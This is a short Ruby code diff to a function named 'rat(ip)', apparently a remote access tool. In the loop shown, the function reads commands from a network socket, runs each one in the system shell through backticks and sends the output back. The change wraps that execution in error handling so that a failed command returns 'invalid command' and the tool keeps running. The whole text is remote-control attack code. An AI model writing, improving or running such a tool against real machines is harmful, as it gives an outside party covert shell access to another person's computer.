@@ -13,7 +13,11 @@ def rat(ip)
           if cmd == 'exit'
             break
           end
-          socket.puts `#{cmd}`
+          begin
+            socket.puts `#{cmd}`
+          rescue Errno::ENOENT
+            socket.puts 'invalid command'
+          end
           socket.puts 'done'
         end
       end
